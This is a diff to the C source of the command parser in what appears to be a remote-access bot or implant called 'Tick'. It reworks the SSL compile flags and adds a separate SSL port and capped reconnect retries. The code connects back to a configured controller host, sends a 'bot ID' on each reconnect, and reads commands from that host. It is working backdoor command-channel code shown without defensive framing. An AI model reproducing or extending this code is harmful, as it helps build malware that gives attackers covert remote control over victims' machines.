@@ -75,8 +75,9 @@ void parser_init(Parser *parser, const Settings *settings)
     memcpy(parser->hostname, settings->hostname, sizeof(parser->hostname));
     parser->port = settings->port;
     parser->fd = -1;
-#ifndef TICK_FEATURES_NO_CRYPTO
+#if TICK_FEATURES_CRYPTO
     parser->use_ssl = settings->use_ssl;
+    parser->ssl_port = settings->ssl_port;
     memset(&parser->ssl, 0, sizeof(parser->ssl));
 #endif
     parser->header.cmd_id = 0;
@@ -93,7 +94,7 @@ void parser_close(Parser *parser)
         close(parser->fd);
     }
     parser->fd = -1;
-#ifndef TICK_FEATURES_NO_CRYPTO
+#if TICK_FEATURES_CRYPTO
     memset(&parser->ssl, 0, sizeof(parser->ssl));
 #endif
     parser->header.cmd_id = 0;
@@ -109,14 +110,14 @@ void parser_begin_response(Parser *parser, uint8_t status, uint16_t length)
 
     resp.status = status;
     resp.data_len = htonl(length);
-#ifdef TICK_FEATURES_NO_CRYPTO
-    send_block(parser->fd, (const char *) &resp, sizeof(resp));
-#else
+#if TICK_FEATURES_CRYPTO
     if (parser->use_ssl) {
         ssl_send_block(&parser->ssl, (const char *) &resp, sizeof(resp));
     } else {
         send_block(parser->fd, (const char *) &resp, sizeof(resp));
     }
+#else
+    send_block(parser->fd, (const char *) &resp, sizeof(resp));
 #endif
 }
 
@@ -138,14 +139,14 @@ void parser_error(Parser *parser, const char *error)
     }
     parser_begin_response(parser, CMD_STATUS_ERROR, length);
     if (length > 0) {
-#ifdef TICK_FEATURES_NO_CRYPTO
-        send_block(parser->fd, error, length);
-#else
+#if TICK_FEATURES_CRYPTO
         if (parser->use_ssl) {
             ssl_send_block(&parser->ssl, error, length);
         } else {
             send_block(parser->fd, error, length);
         }
+#else
+        send_block(parser->fd, error, length);
 #endif
     }
 }
@@ -165,49 +166,53 @@ void parser_connect(Parser *parser)
         // Close the old socket and reset internal variables.
         parser_close(parser);
 
-        // Reconnection only makes sense when using TCP connect back.
-        // Make sure this is the case.
-        if (parser->hostname != NULL) {
-
-            // Connect to the given hostname and port.
-            LOG("Connecting to %s:%d...\n", parser->hostname, parser->port);
-            while (parser->fd < 0) {
-#ifdef TICK_FEATURES_NO_CRYPTO
-                parser->fd = connect_to_host(parser->hostname, parser->port);
-#else
-                if (parser->use_ssl) {
-                    parser->fd = -1;
-                    ssl_connect_to_host(&parser->ssl, &parser->fd, parser->hostname, parser->port);
-                } else {
-                    parser->fd = connect_to_host(parser->hostname, parser->port);
-                }
-#endif
-                if (parser->fd < 0) {
-                    LOG("Error connecting, waiting 30 seconds to retry...\n");
-                    sleep(30);  // Sleep 30 seconds between failed attempts
-                } else {
-                    LOG("Connected to %s:%d\n", parser->hostname, parser->port);
-                }
-            }
-
-            // Send the bot ID immediately after a successful (re)connection.
-#ifdef TICK_FEATURES_NO_CRYPTO
-            send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
-#else
+        // Connect to the given hostname and port.
+        int retries = TICK_CONNECT_RETRY_TIMES;
+        while (parser->fd < 0) {
+#if TICK_FEATURES_CRYPTO
             if (parser->use_ssl) {
-                ssl_send_block(&parser->ssl, parser->uuid, sizeof(parser->uuid));
+                parser->fd = -1;
+                LOG("Connecting to %s:%d (SSL)...\n", parser->hostname, parser->ssl_port);
+                ssl_connect_to_host(&parser->ssl, &parser->fd, parser->hostname, parser->ssl_port);
             } else {
-                send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
+                LOG("Connecting to %s:%d...\n", parser->hostname, parser->port);
+                parser->fd = connect_to_host(parser->hostname, parser->port);
             }
+#else
+            LOG("Connecting to %s:%d...\n", parser->hostname, parser->port);
+            parser->fd = connect_to_host(parser->hostname, parser->port);
 #endif
+            if (parser->fd < 0) {
+                if (retries > 0) retries--;
+                if (retries == 0) {
+                    LOG("Error connecting, quitting after %d retries\n", TICK_CONNECT_RETRY_TIMES);
+                    break;
+                }
+                LOG("Error connecting, waiting %d seconds to retry...\n", TICK_CONNECT_RETRY_PAUSE);
+                sleep(TICK_CONNECT_RETRY_PAUSE);
+            } else {
+                LOG("Connected, socket is %d\n", parser->fd);
+            }
+        }
 
         // If reconnection is not possible, set a fake quit command.
-        // This will kill the listener on error.
-        } else {
+        if (parser->fd < 0) {
             parser->header.cmd_id = CMD_SYSTEM_EXIT;
             parser->header.cmd_len = 0;
             parser->header.data_len = 0;
+            return;
         }
+
+        // Send the bot ID immediately after a successful (re)connection.
+#if TICK_FEATURES_CRYPTO
+        if (parser->use_ssl) {
+            ssl_send_block(&parser->ssl, parser->uuid, sizeof(parser->uuid));
+        } else {
+            send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
+        }
+#else
+        send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
+#endif
     }
 }
 
@@ -229,14 +234,14 @@ void parser_wait(Parser *parser)
     while (1) {
         memset((void *) &parser->header, 0, sizeof(parser->header));
         int success = 0;
-#ifdef TICK_FEATURES_NO_CRYPTO
-        success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header));
-#else
+#if TICK_FEATURES_CRYPTO
         if (parser->use_ssl) {
             success = ssl_recv_block(&parser->ssl, (char *) &parser->header, sizeof(parser->header));
         } else {
             success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header));
         }
+#else
+        success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header));
 #endif
         if (success < 0) {
             parser_close(parser);
@@ -272,14 +277,14 @@ void parser_next(Parser *parser)
 
             // Skip as many bytes as needed.
             int success = 0;
-#ifdef TICK_FEATURES_NO_CRYPTO
-            success = consume_extra_data(parser->fd, extra_data);
-#else
+#if TICK_FEATURES_CRYPTO
             if (parser->use_ssl) {
                 success = ssl_consume_extra_data(&parser->ssl, extra_data);
             } else {
                 success = consume_extra_data(parser->fd, extra_data);
             }
+#else
+            success = consume_extra_data(parser->fd, extra_data);
 #endif
             if (success < 0) {
 
@@ -318,14 +323,14 @@ int parser_read_first_arg(Parser *parser, char *buffer, size_t count)
     // Load the first argument into the buffer.
     memset((void *) buffer, 0, count);
     int success = 0;
-#ifdef TICK_FEATURES_NO_CRYPTO
-    success = recv_block(parser->fd, buffer, parser->header.cmd_len);
-#else
+#if TICK_FEATURES_CRYPTO
     if (parser->use_ssl) {
         success = ssl_recv_block(&parser->ssl, buffer, parser->header.cmd_len);
     } else {
         success = recv_block(parser->fd, buffer, parser->header.cmd_len);
     }
+#else
+    success = recv_block(parser->fd, buffer, parser->header.cmd_len);
 #endif
 
     // On error drop the connection.
